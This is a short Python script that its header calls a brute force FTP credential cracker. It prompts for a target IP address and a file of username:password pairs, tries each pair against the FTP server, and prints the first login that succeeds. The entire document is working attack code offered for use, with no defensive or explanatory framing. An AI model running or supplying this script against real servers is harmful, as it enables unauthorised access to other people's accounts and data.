#!/usr/bin/python
#-*- coding:utf-8 -*-
#Author: Isaac Privett
#Date: 05-01-2022
#Description: Brute force ftp credential cracker

import ftplib

def bruteLogin(hostname, passwdFile):
	try:
		pF = open(passwdFile, "r")
	except:
		print("File doesn't exist")
	for line in pF.readlines():
		username = line.split(':')[0]
		password = line.split(':')[1].strip('\n')
		print("[+] Tryin: " + username + "/" + password)
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(username, password)
			print("[+] Login succeed with :" + username + "/" + password)
			ftp.quit()
			return(username,password)
		except:
			pass
	print("[-] Password not in list.")


host = input("[*] Enter target's IP address: ")
passwdFile = input("[*] Enter credential file path: ")
bruteLogin(host, passwdFile)
